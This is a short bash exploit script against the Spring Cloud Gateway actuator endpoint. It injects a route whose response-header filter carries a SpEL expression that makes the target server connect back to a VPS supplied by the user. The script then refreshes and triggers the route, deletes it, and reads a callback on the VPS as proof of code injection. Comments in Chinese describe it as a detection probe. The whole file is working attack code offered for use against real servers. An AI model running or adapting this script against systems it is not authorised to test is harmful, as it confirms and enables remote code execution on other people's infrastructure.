#!/usr/bin/env bash
TARGET="${1:?usage: bash scg.sh http://TARGET:PORT <VPS>}"
VPS="${2:?usage: bash scg.sh http://TARGET:PORT <VPS>}"
B="${TARGET%/}"
curl -sS -m 10 -o /dev/null -w 'routes=%{http_code}\n' "$B/actuator/gateway/routes"

# 探测：SpEL 里只做 DNS 回连（不执行命令）
SPEL="#{new java.net.URL(\"http://$VPS:9000/spel-probe\").openConnection().getInputStream()}"
BODY=$(python3 - "$SPEL" <<'PY'
import json, sys
spel = sys.argv[1]
print(json.dumps({
  "id": "rtprobe", "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/rtprobe"}}],
  "filters": [{"name": "AddResponseHeader", "args": {"name": "X-Probe", "value": spel}}],
}))
PY
)
curl -sS -m 15 -X POST "$B/actuator/gateway/routes/rtprobe" -H 'Content-Type: application/json' --data "$BODY" -o /dev/null -w 'add=%{http_code}\n'
curl -sS -m 15 -X POST "$B/actuator/refresh" -o /dev/null -w 'refresh=%{http_code}\n'
curl -sS -m 10 -o /dev/null -w 'trigger=%{http_code}\n' "$B/rtprobe"
# 清理注入的路由
curl -sS -m 10 -X DELETE "$B/actuator/gateway/routes/rtprobe" -o /dev/null -w 'cleanup=%{http_code}\n'
# 判定：VPS 的 9000 端口收到 /spel-probe 请求
